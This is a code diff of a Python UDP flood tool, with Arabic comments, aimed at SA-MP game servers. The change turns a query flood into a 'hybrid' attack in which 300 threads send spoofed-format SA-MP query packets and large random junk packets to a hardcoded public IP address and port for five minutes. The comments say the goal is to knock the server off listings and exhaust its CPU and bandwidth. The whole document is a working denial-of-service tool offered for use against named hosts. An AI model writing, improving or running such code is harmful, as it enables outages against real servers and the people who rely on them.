@@ -1,60 +1,62 @@
 import socket
-import time
-import threading
 import random
+import threading
+import time
 
 # =====================================================================
-# === TRAPKING SAMP SMART QUERY STRESSOR (Advanced Edition) ===
+# === TRAPKING DUAL-TARGET HYBRID STRESSOR (Query + Game Flood) ===
 # =====================================================================
 
-TARGET_IP = "89.46.1.130"  # الـ IP المستهدف (أو 89.46.1.130)
-TARGET_PORT = 7008            # البورت المستهدف (مثلاً 7777 أو 7008)
-DURATION = 60                 # مدة الاختبار بالثواني
-THREADS_COUNT = 250           # عدد الخيوط لاستغلال Ryzen 9
+TARGET_IP = "94.23.168.153"  # IP الهدف
+TARGET_PORT = 2343            # البورت الرئيسي (استعلام + لعب)
+DURATION = 300                 # مدة التشغيل بالثواني
+THREADS_COUNT = 300           # عدد الخيوط لاستغلال قوة Ryzen 9
 
-# أنواع طلبات الاستعلام الحقيقية الخاصة ببروتوكول SA-MP لإرباك معالج السيرفر
-# 'i' = Info, 'c' = Clients, 'r' = Rules, 'd' = Details
+# أنواع الاستعلامات المتاحة
 QUERY_TYPES = [b'i', b'c', b'r', b'd']
 
-def generate_samp_payload(ip_str, port_int):
-    try:
-        # بناء ترويسة استعلام SA-MP أصلية وصحيحة تقنياً
-        ip_bytes = socket.inet_aton(ip_str)
-        port_bytes = int(port_int).to_bytes(2, 'little')
-        q_type = random.choice(QUERY_TYPES)
-        # هيكل حزمة الاستعلام: 'S' 'A' 'M' 'P' + IP + Port + Query Type
-        return b'SAMP' + ip_bytes + port_bytes + q_type
-    except:
-        return b'SAMP'
-
-def attack_worker():
+def hybrid_attack_worker():
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     end_time = time.time() + DURATION
     
-    payload = generate_samp_payload(TARGET_IP, TARGET_PORT)
-    
+    # تحضير ترويسة الاستعلام مسبقاً لتوفير أداء المعالج
+    try:
+        ip_bytes = socket.inet_aton(TARGET_IP)
+        port_bytes = int(TARGET_PORT).to_bytes(2, 'little')
+    except:
+        return
+
     while time.time() < end_time:
         try:
-            client.sendto(payload, (TARGET_IP, TARGET_PORT))
+            # 1. إرسال حزمة استعلام (لإخفاء السيرفر من القوائم وإجهاد الـ CPU)
+            q_type = random.choice(QUERY_TYPES)
+            query_packet = b'SAMP' + ip_bytes + port_bytes + q_type
+            client.sendto(query_packet, (TARGET_IP, TARGET_PORT))
+            
+            # 2. إرسال حزمة ضغط عشوائية بحجم كبير (لإشغال ممر الشبكة Bandwidth)
+            junk_size = random.randint(512, 1200)
+            junk_packet = b'SAMP' + random._urandom(junk_size)
+            client.sendto(junk_packet, (TARGET_IP, TARGET_PORT))
+            
         except:
             pass
             
     client.close()
 
 def main():
-    print(f"[*] بدء الهجوم الذكي والمطور على سيرفر SA-MP: {TARGET_IP}:{TARGET_PORT}")
-    print(f"[*] استخدام {THREADS_COUNT} خيط عبر الـ VPS وبث طلبات استعلام حقيقية...")
+    print(f"[*] بدء الهجوم المزدوج والهجين على سيرفر SA-MP: {TARGET_IP}:{TARGET_PORT}")
+    print(f"[*] دمج حزم الاستعلام وحزم الضغط الشبكي عبر {THREADS_COUNT} خيط...")
     
     threads = []
     for _ in range(THREADS_COUNT):
-        t = threading.Thread(target=attack_worker)
+        t = threading.Thread(target=hybrid_attack_worker)
         threads.append(t)
         t.start()
         
     for t in threads:
         t.join()
         
-    print("\n[+] انتهت عملية الاختبار بنجاح.")
+    print("\n[+] انتهت الجلسة المزدوجة بنجاح.")
 
 if __name__ == "__main__":
     main()
